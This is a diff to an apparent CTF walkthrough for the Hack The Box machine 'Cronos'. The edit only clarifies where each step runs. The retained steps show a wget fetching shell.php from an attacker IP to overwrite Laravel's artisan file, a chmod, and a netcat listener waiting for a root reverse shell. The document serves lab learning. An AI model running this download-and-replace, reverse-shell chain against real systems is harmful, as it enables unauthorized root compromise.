@@ -89,10 +89,10 @@ gobuster dns -d cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/nameli
 
 + Transfer to the target.
 + `cd /var/www/laravel/` on the target.
-+ `wget 10.10.14.18:8000/shell.php -O artisan`
-+ `chmod +x artisan`
++ `wget 10.10.14.18:8000/shell.php -O artisan` on the target.
++ `chmod +x artisan` on the target.
 
-+ Start listener: `nc -lnvp 5555`
++ Start listener: `nc -lnvp 5555` on your attack machine.
 + Get root shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca0fd82-2a1b-4293-bbe0-8f697cba3cdd)
